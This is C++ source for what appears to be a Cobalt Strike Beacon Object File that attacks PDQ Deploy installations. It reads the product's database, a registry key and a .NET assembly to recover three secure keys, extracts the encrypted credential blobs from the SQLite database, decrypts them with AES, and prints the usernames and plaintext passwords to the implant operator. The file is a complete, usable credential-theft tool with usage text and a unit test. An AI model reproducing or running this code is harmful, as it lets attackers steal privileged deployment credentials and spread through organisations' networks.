#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif


#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
#include "base/aes.c"
#include "base/utils.cpp"

    DFR(MSVCRT, memcpy)
#define memcpy MSVCRT$memcpy
        DFR(MSVCRT, memcmp)
#define memcmp MSVCRT$memcmp
        DFR(MSVCRT, strlen)
#define strlen MSVCRT$strlen
        DFR(KERNEL32, CreateFileA);
#define CreateFileA KERNEL32$CreateFileA
    DFR(KERNEL32, ReadFile);
#define ReadFile KERNEL32$ReadFile
    DFR(KERNEL32, CloseHandle);
#define CloseHandle KERNEL32$CloseHandle
    DFR(KERNEL32, GetFileSize);
#define GetFileSize KERNEL32$GetFileSize
    DFR(KERNEL32, GetProcessHeap);
#define GetProcessHeap KERNEL32$GetProcessHeap
    DFR(KERNEL32, HeapAlloc);
#define HeapAlloc KERNEL32$HeapAlloc
    DFR(KERNEL32, HeapFree);
#define HeapFree KERNEL32$HeapFree
    DFR(KERNEL32, GetLastError);
#define GetLastError KERNEL32$GetLastError
    DFR(ADVAPI32, RegOpenKeyExA);
#define RegOpenKeyExA ADVAPI32$RegOpenKeyExA
    DFR(ADVAPI32, RegQueryValueExA);
#define RegQueryValueExA ADVAPI32$RegQueryValueExA
    DFR(ADVAPI32, RegCloseKey);
#define RegCloseKey ADVAPI32$RegCloseKey
    DFR(MSVCRT, _stricmp);
#define _stricmp MSVCRT$_stricmp

#define SQLITE_HEADER "SQLite format 3"

    // Define credential structure before using it
    typedef struct {
        char username[64];
        BYTE blob[512];
        DWORD blobLen;
    } CredentialInfo;

    // Global variables to store credentials for decryption
    CredentialInfo* g_credentials = NULL;
    DWORD g_credentialCount = 0;
    
    // Global variables to store keys for decryption
    char g_appSecureKey[64] = { 0 };
    char g_dbSecureKey[64] = { 0 };
    char g_regSecureKey[64] = { 0 };
    BOOL g_appKeyFound = FALSE;
    BOOL g_dbKeyFound = FALSE;
    BOOL g_regKeyFound = FALSE;

    void extract_credentials_from_db(const BYTE* data, DWORD fileSize) {
        const char* marker = "(encrypted)";
        const DWORD markerLen = 11;
        const char* noneMarker = "None";
        const DWORD noneLen = 4;
        
        // Local variables for credential collection
        CredentialInfo* credentials = NULL;
        DWORD credCount = 0;
        DWORD maxCreds = 10; // Initial allocation
        
        credentials = (CredentialInfo*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CredentialInfo) * maxCreds);
        if (!credentials) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for credentials");
            return;
        }

        for (DWORD i = 0; i < fileSize - markerLen - 64; i++) {
            if (memcmp(&data[i], marker, markerLen) == 0 && data[i + markerLen] == '\0') {
                DWORD start = i;

                // Go backward to find the username
                int nameStart = i - 1;
                while (nameStart > 0 && data[nameStart] >= 32 && data[nameStart] <= 126) {
                    nameStart--;
                }
                nameStart++;

                char username[64] = { 0 };
                int nameLen = i - nameStart;
                if (nameLen > 0 && nameLen < sizeof(username)) {
                    memcpy(username, &data[nameStart], nameLen);
                    username[nameLen] = '\0';
                }

                // Find "None" marker
                DWORD end = start + 16; // minimum buffer
                for (; end < fileSize - noneLen; end++) {
                    if (memcmp(&data[end], noneMarker, noneLen) == 0) {
                        break;
                    }
                }

                if (end >= fileSize - noneLen) {
                    BeaconPrintf(CALLBACK_ERROR, "Could not locate end of password blob for %s", username);
                    continue;
                }

                DWORD blobLen = end - start;
                if (blobLen > 512) blobLen = 512; // safety cap

                char hexBlob[1025] = { 0 }; // 512 bytes = 1024 hex chars
                const char hexChars[] = "0123456789ABCDEF";

                for (DWORD j = 0; j < blobLen && j < 512; j++) {
                    BYTE val = data[start + j];
                    hexBlob[j * 2] = hexChars[(val >> 4) & 0xF];
                    hexBlob[j * 2 + 1] = hexChars[val & 0xF];
                }

                BeaconPrintf(CALLBACK_OUTPUT, "UserName: %s", username);
                BeaconPrintf(CALLBACK_OUTPUT, "EncryptedPasswordBlob: %s", hexBlob);
                
                // Store credential for later decryption
                if (credCount >= maxCreds) {
                    // Resize array if needed
                    maxCreds *= 2;
                    CredentialInfo* newCreds = (CredentialInfo*)HeapAlloc(
                        GetProcessHeap(), 
                        HEAP_ZERO_MEMORY, 
                        sizeof(CredentialInfo) * maxCreds
                    );
                    if (!newCreds) {
                        BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory for credentials");
                        break;
                    }
                    
                    memcpy(newCreds, credentials, sizeof(CredentialInfo) * credCount);
                    HeapFree(GetProcessHeap(), 0, credentials);
                    credentials = newCreds;
                }
                
                // Store the credential
                memcpy(credentials[credCount].username, username, strlen(username) + 1);
                memcpy(credentials[credCount].blob, &data[start], blobLen);
                credentials[credCount].blobLen = blobLen;
                credCount++;
            }
        }
        
        // Return the credentials for later decryption
        BeaconPrintf(CALLBACK_OUTPUT, "Found %d credential entries", credCount);
        
        // Set global variables for later use
        g_credentials = credentials;
        g_credentialCount = credCount;
    }

    extern "C" void sha256(const unsigned char* data, size_t len, unsigned char* out);

    // Forward declaration with BOOL return type
    BOOL decrypt_blob(const char* username, const BYTE* blob, DWORD blobLen, const char* combinedKey);

    BOOL decrypt_blob(const char* username, const BYTE* blob, DWORD blobLen, const char* combinedKey) {
        const char* marker = "(encrypted)";
        const DWORD markerLen = 11;

        if (blobLen < markerLen + 1 + 16 + 16) return FALSE;
        if (memcmp(blob, marker, markerLen) != 0 || blob[markerLen] != '\0') return FALSE;

        const BYTE ivLen = blob[markerLen + 1];
        if (ivLen != 16) {
            BeaconPrintf(CALLBACK_ERROR, "Warning: Unexpected IV length: %d (expected 16)", ivLen);
            return FALSE;
        }

        const BYTE* iv = &blob[markerLen + 2];
        const BYTE* encData = &blob[markerLen + 2 + ivLen];
        DWORD encLen = blobLen - (markerLen + 2 + ivLen);

        // Derive AES key: SHA256(combinedKey) → first 16 bytes
        BYTE hash[32];
        sha256((const BYTE*)combinedKey, strlen(combinedKey), hash);
        BYTE aes_key[16];
        memcpy(aes_key, hash, 16);

        // Allocate memory and decrypt
        BYTE* decrypted = (BYTE*)HeapAlloc(GetProcessHeap(), 0, encLen);
        if (!decrypted) return FALSE;

        memcpy(decrypted, encData, encLen);

        AES_ctx ctx;
        AES_init_ctx_iv(&ctx, aes_key, iv);
        AES_CBC_decrypt_buffer(&ctx, decrypted, encLen);

        // Extract password length (first 4 bytes)
        if (encLen < 4) {
            HeapFree(GetProcessHeap(), 0, decrypted);
            return FALSE;
        }

        DWORD pwLen = *(DWORD*)decrypted;
        if (pwLen > 0 && pwLen <= encLen - 4 && pwLen < 128) {
            char pw[129] = { 0 };
            memcpy(pw, decrypted + 4, pwLen);
            pw[pwLen] = '\0';

            BeaconPrintf(CALLBACK_OUTPUT, "Decrypted password for %s: %s", username, pw);
            HeapFree(GetProcessHeap(), 0, decrypted);
            return TRUE; // Return TRUE for successful decryption
        }
        else {
            // Don't output error messages for failed attempts during the iterative key search
            HeapFree(GetProcessHeap(), 0, decrypted);
            return FALSE; // Return FALSE for failed decryption
        }
    }

    void attempt_decryption() {
        // Check if we have credentials and keys
        if (!g_credentials || g_credentialCount == 0) {
            BeaconPrintf(CALLBACK_ERROR, "No credentials to decrypt");
            return;
        }

        // We need at least one key to attempt decryption
        if (!g_appKeyFound && !g_dbKeyFound && !g_regKeyFound) {
            BeaconPrintf(CALLBACK_ERROR, "No secure keys found for decryption");
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "Attempting to decrypt %d credentials", g_credentialCount);
        
        DWORD successCount = 0;
        
        for (DWORD i = 0; i < g_credentialCount; i++) {
            BOOL decrypted = FALSE;
            
            if (!decrypted && g_appKeyFound && g_dbKeyFound && g_regKeyFound) {
                char combinedKey[256] = { 0 };
                DWORD offset = 0;
                
                memcpy(combinedKey + offset, g_appSecureKey, strlen(g_appSecureKey));
                offset += strlen(g_appSecureKey);
                
                memcpy(combinedKey + offset, g_dbSecureKey, strlen(g_dbSecureKey));
                offset += strlen(g_dbSecureKey);
                
                memcpy(combinedKey + offset, g_regSecureKey, strlen(g_regSecureKey));
                
                decrypted = decrypt_blob(
                    g_credentials[i].username,
                    g_credentials[i].blob,
                    g_credentials[i].blobLen,
                    combinedKey
                );
                
                if (decrypted) {
                    successCount++;
                    continue;
                }
            }
            
            if (!decrypted) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to decrypt credentials for: %s", g_credentials[i].username);
            }
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully decrypted %d of %d credentials", 
            successCount, g_credentialCount);
        
        // Cleanup credentials after attempting decryption
        HeapFree(GetProcessHeap(), 0, g_credentials);
        g_credentials = NULL;
        g_credentialCount = 0;
    }
    
    // Extract secure keys from registry, database, and .NET assembly
    void extract_secure_keys() {
        BOOL foundAny = FALSE;
        
        // --- First, check database for SecureKey ---
        HANDLE hFile = CreateFileA(
            "C:\\ProgramData\\Admin Arsenal\\PDQ Deploy\\Database.db",
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                HANDLE heap = GetProcessHeap();
                BYTE* data = (BYTE*)HeapAlloc(heap, 0, fileSize);
                if (data) {
                    DWORD bytesRead;
                    if (ReadFile(hFile, data, fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
                        for (DWORD i = 0; i < fileSize - 36; i++) {
                            if (is_guid((const char*)&data[i])) {
                                char guid[37] = { 0 };
                                memcpy(guid, &data[i], 36);
                                BeaconPrintf(CALLBACK_OUTPUT, "DB SecureKey: %s", guid);
                                memcpy(g_dbSecureKey, guid, 36);
                                g_dbKeyFound = TRUE;
                                foundAny = TRUE;
                                break;
                            }
                        }
                    }
                    HeapFree(heap, 0, data);
                }
            }
            CloseHandle(hFile);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to open DB file: %i", GetLastError());
        }

        // --- Second, check Registry SecureKey ---
        HKEY hKey;
        LONG regResult = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Admin Arsenal\\PDQ Deploy",
            0,
            KEY_READ,
            &hKey
        );

        if (regResult == ERROR_SUCCESS) {
            char value[256] = { 0 };
            DWORD valueSize = sizeof(value);
            DWORD type = 0;

            regResult = RegQueryValueExA(
                hKey,
                "Secure Key",
                NULL,
                &type,
                (LPBYTE)&value,
                &valueSize
            );

            if (regResult == ERROR_SUCCESS && type == REG_SZ) {
                BeaconPrintf(CALLBACK_OUTPUT, "Registry SecureKey: %s", value);
                memcpy(g_regSecureKey, value, strlen(value));
                g_regKeyFound = TRUE;
                foundAny = TRUE;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "Failed to read Registry Secure Key: %i", regResult);
            }
            
            RegCloseKey(hKey);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA failed: %i", regResult);
        }

        // --- Third, check .NET Assembly SecureKey ---
        HANDLE hAssembly = CreateFileA(
            "C:\\Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\AdminArsenal.PDQDeploy.dll",
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );

        if (hAssembly != INVALID_HANDLE_VALUE) {
            DWORD asmSize = GetFileSize(hAssembly, NULL);
            if (asmSize != INVALID_FILE_SIZE && asmSize >= 72) {
                HANDLE heap = GetProcessHeap();
                BYTE* asmData = (BYTE*)HeapAlloc(heap, 0, asmSize);
                if (asmData) {
                    DWORD bytesRead;
                    if (ReadFile(hAssembly, asmData, asmSize, &bytesRead, NULL) && bytesRead == asmSize) {
                        for (DWORD i = 0; i < asmSize - 72; i += 2) {
                            if (is_guid_utf16((wchar_t*)&asmData[i])) {
                                wchar_t wguid[37] = { 0 };
                                memcpy(wguid, &asmData[i], 36 * sizeof(wchar_t));

                                char guid[37] = { 0 };
                                for (int k = 0; k < 36; k++) {
                                    guid[k] = (char)wguid[k];
                                }

                                BeaconPrintf(CALLBACK_OUTPUT, "Application SecureKey: %s", guid);
                                memcpy(g_appSecureKey, guid, 36);
                                g_appKeyFound = TRUE;
                                foundAny = TRUE;
                                break;
                            }
                        }
                    }
                    HeapFree(heap, 0, asmData);
                }
            }
            CloseHandle(hAssembly);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to open .NET assembly: %i", GetLastError());
        }
        
        // Report summary of findings
        if (g_appKeyFound && g_dbKeyFound && g_regKeyFound) {
            BeaconPrintf(CALLBACK_OUTPUT, "SUCCESS: All three SecureKeys found. Decryption should be possible.");
        }
        else if (foundAny) {
            BeaconPrintf(CALLBACK_OUTPUT, "WARNING: Found %d of 3 SecureKeys. Decryption may be limited.", 
                g_appKeyFound + g_dbKeyFound + g_regKeyFound);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "FAILED: No SecureKeys found. Decryption not possible.");
        }
    }

    void go(char* args, int len) {
        // Parse arguments to determine mode
        BOOL check_mode = FALSE;
        BOOL credentials_mode = FALSE;
        char* arg;
        
        // Default to credentials mode if no args provided
        if (len == 0) {
            credentials_mode = TRUE;
        }
        else {
            // Parse arguments
            datap parser;
            BeaconDataParse(&parser, args, len);
            arg = BeaconDataExtract(&parser, NULL);
            
            if (arg && _stricmp(arg, "check") == 0) {
                check_mode = TRUE;
            }
            else if (arg && _stricmp(arg, "creds") == 0) {
                credentials_mode = TRUE;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "Unknown argument: %s", arg ? arg : "(null)");
                BeaconPrintf(CALLBACK_ERROR, "Usage: inline-execute bof.o [check|creds]");
                BeaconPrintf(CALLBACK_ERROR, "  check       - Check if SecureKeys are available");
                BeaconPrintf(CALLBACK_ERROR, "  creds       - Extract and decrypt credentials (default)");
                return;
            }
        }
        
        // Check mode - only extract SecureKeys, don't touch credentials
        if (check_mode) {
            BeaconPrintf(CALLBACK_OUTPUT, "Checking for PDQ Deploy SecureKeys...");
            extract_secure_keys();
            return;
        }
        
        // Credentials mode - extract and decrypt credentials
        if (credentials_mode) {
            // --- First, read the database and extract credentials ---
            HANDLE hFile = CreateFileA(
                "C:\\ProgramData\\Admin Arsenal\\PDQ Deploy\\Database.db",
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                0,
                NULL
            );

            if (hFile == INVALID_HANDLE_VALUE) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to open DB file: %i", GetLastError());
            }
            else {
                DWORD fileSize = GetFileSize(hFile, NULL);
                if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
                    BeaconPrintf(CALLBACK_ERROR, "Invalid DB file size");
                    CloseHandle(hFile);
                }
                else {
                    HANDLE heap = GetProcessHeap();
                    BYTE* data = (BYTE*)HeapAlloc(heap, 0, fileSize);
                    if (!data) {
                        BeaconPrintf(CALLBACK_ERROR, "HeapAlloc failed");
                        CloseHandle(hFile);
                    }
                    else {
                        DWORD bytesRead;
                        if (!ReadFile(hFile, data, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to read DB file: %i", GetLastError());
                        }
                        else {
                            if (memcmp(data, SQLITE_HEADER, 16) == 0) {
                                BeaconPrintf(CALLBACK_OUTPUT, "Valid SQLite DB. Extracting credentials...");
                                extract_credentials_from_db(data, fileSize);
                                
                                // Look for the database SecureKey GUID in the DB file
                                for (DWORD i = 0; i < fileSize - 36; i++) {
                                    if (is_guid((const char*)&data[i])) {
                                        char guid[37] = { 0 };
                                        memcpy(guid, &data[i], 36);
                                        BeaconPrintf(CALLBACK_OUTPUT, "Found DB SecureKey");
                                        memcpy(g_dbSecureKey, guid, 36);
                                        g_dbKeyFound = TRUE;
                                        break;
                                    }
                                }
                            }
                            else {
                                BeaconPrintf(CALLBACK_ERROR, "Not a valid SQLite DB");
                            }
                        }

                        HeapFree(heap, 0, data);
                        CloseHandle(hFile);
                    }
                }
            }

            // --- Second, extract Registry SecureKey ---
            HKEY hKey;
            LONG regResult = RegOpenKeyExA(
                HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Admin Arsenal\\PDQ Deploy",
                0,
                KEY_READ,
                &hKey
            );

            if (regResult != ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA failed: %i", regResult);
            }
            else {
                char value[256] = { 0 };
                DWORD valueSize = sizeof(value);
                DWORD type = 0;

                regResult = RegQueryValueExA(
                    hKey,
                    "Secure Key",
                    NULL,
                    &type,
                    (LPBYTE)&value,
                    &valueSize
                );

                if (regResult == ERROR_SUCCESS && type == REG_SZ) {
                    BeaconPrintf(CALLBACK_OUTPUT, "Found Registry SecureKey");
                    memcpy(g_regSecureKey, value, strlen(value));
                    g_regKeyFound = TRUE;
                }
                else {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to read Registry Secure Key: %i", regResult);
                }
                
                RegCloseKey(hKey);
            }

            // --- Third, extract .NET Assembly SecureKey ---
            HANDLE hAssembly = CreateFileA(
                "C:\\Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\AdminArsenal.PDQDeploy.dll",
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                0,
                NULL
            );

            if (hAssembly == INVALID_HANDLE_VALUE) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to open .NET assembly: %i", GetLastError());
            }
            else {
                DWORD asmSize = GetFileSize(hAssembly, NULL);
                if (asmSize == INVALID_FILE_SIZE || asmSize < 72) {
                    BeaconPrintf(CALLBACK_ERROR, "Invalid assembly file size");
                    CloseHandle(hAssembly);
                }
                else {
                    HANDLE heap = GetProcessHeap();
                    BYTE* asmData = (BYTE*)HeapAlloc(heap, 0, asmSize);
                    if (!asmData) {
                        BeaconPrintf(CALLBACK_ERROR, "HeapAlloc failed for assembly");
                        CloseHandle(hAssembly);
                    }
                    else {
                        DWORD bytesRead;
                        if (!ReadFile(hAssembly, asmData, asmSize, &bytesRead, NULL) || bytesRead != asmSize) {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to read assembly: %i", GetLastError());
                        }
                        else {
                            BOOL found = FALSE;

                            for (DWORD i = 0; i < asmSize - 72; i += 2) {
                                if (is_guid_utf16((wchar_t*)&asmData[i])) {
                                    wchar_t wguid[37] = { 0 };
                                    memcpy(wguid, &asmData[i], 36 * sizeof(wchar_t));

                                    char guid[37] = { 0 };
                                    for (int k = 0; k < 36; k++) {
                                        guid[k] = (char)wguid[k];
                                    }

                                    BeaconPrintf(CALLBACK_OUTPUT, "Found Application SecureKey");
                                    memcpy(g_appSecureKey, guid, 36);
                                    g_appKeyFound = TRUE;
                                    found = TRUE;
                                    break;
                                }
                            }

                            if (!found) {
                                BeaconPrintf(CALLBACK_ERROR, "No Application SecureKey GUID found in assembly");
                            }
                        }

                        HeapFree(heap, 0, asmData);
                        CloseHandle(hAssembly);
                    }
                }
            }
            attempt_decryption();
        }
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "DB SecureKey: bd30b186-8ff3-41cc-b73f-82592775f6a8"},
        {CALLBACK_OUTPUT, "Registry SecureKey: a7579900-06c4-4a99-9358-0146b6db0bcd"},
        {CALLBACK_OUTPUT, "Application SecureKey: 043E2818-3D63-41F9-9803-B03593F33C7D"},
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif